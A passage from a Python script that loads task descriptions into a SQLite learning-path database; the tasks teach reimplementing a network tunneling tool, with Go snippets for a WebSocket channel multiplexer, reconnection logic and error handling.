        // Parse: [type:1][chanID:4][length:4][payload:N]
        chanID := binary.BigEndian.Uint32(data[1:5])
        payload := data[9:]

        m.mu.RLock()
        ch, ok := m.channels[chanID]
        m.mu.RUnlock()

        if ok {
            ch.conn.Write(payload)
        }
    }
}

func (m *Multiplexer) OpenChannel(target string) (*Channel, error) {
    conn, err := net.Dial("tcp", target)
    if err != nil {
        return nil, err
    }

    m.mu.Lock()
    ch := &Channel{ID: m.nextID, conn: conn}
    m.channels[m.nextID] = ch
    m.nextID++
    m.mu.Unlock()

    // Forward data from connection to websocket
    go m.channelReadLoop(ch)

    return ch, nil
}
```

### Completion Criteria
- [ ] Implement WebSocket transport
- [ ] Build channel multiplexer
- [ ] Add SOCKS5 protocol handler
- [ ] Implement port forwarding""",

    ("Reimplement: Network Tunneling Tools", "Add error handling"): """## Tunneling Error Handling

### Connection Errors
```go
package tunnel

import (
    "errors"
    "time"
)

var (
    ErrConnectionClosed = errors.New("connection closed")
    ErrChannelNotFound  = errors.New("channel not found")
    ErrAuthFailed       = errors.New("authentication failed")
    ErrTimeout          = errors.New("operation timed out")
)

type ReconnectingClient struct {
    serverAddr   string
    maxRetries   int
    retryDelay   time.Duration
    mux          *Multiplexer
}

func (c *ReconnectingClient) Connect() error {
    var lastErr error

    for i := 0; i < c.maxRetries; i++ {
        ws, err := websocket.Dial(c.serverAddr, nil, nil)
        if err == nil {
            c.mux = NewMultiplexer(ws)
            return nil
        }
        lastErr = err
        time.Sleep(c.retryDelay * time.Duration(i+1))
    }

    return fmt.Errorf("failed after %d retries: %w", c.maxRetries, lastErr)
}

// Graceful channel closure
func (m *Multiplexer) CloseChannel(id uint32) {
    m.mu.Lock()
    defer m.mu.Unlock()

    if ch, ok := m.channels[id]; ok {
        ch.conn.Close()
        delete(m.channels, id)

        // Send channel close message
        m.sendControlMessage(MsgTypeClose, id)
    }
}
```

### Completion Criteria
- [ ] Handle connection drops gracefully
- [ ] Implement reconnection logic
- [ ] Add channel cleanup on errors
- [ ] Handle timeout scenarios""",
}

def update_tasks():
    """Update tasks with specific details."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    updated = 0
    for (path_name, task_title), details in SPECIFIC_DETAILS.items():
        cursor.execute("""
            UPDATE tasks SET details = ?
            WHERE id IN (
                SELECT t.id FROM tasks t
                JOIN modules m ON t.module_id = m.id
                JOIN paths p ON m.path_id = p.id
                WHERE p.name = ? AND t.title = ?
            )
        """, (details, path_name, task_title))

        if cursor.rowcount > 0:
            updated += cursor.rowcount
            print(f"Updated: {path_name} / {task_title}")

    conn.commit()
    conn.close()
    print(f"\nDone! Updated {updated} tasks.")

if __name__ == "__main__":
    update_tasks()
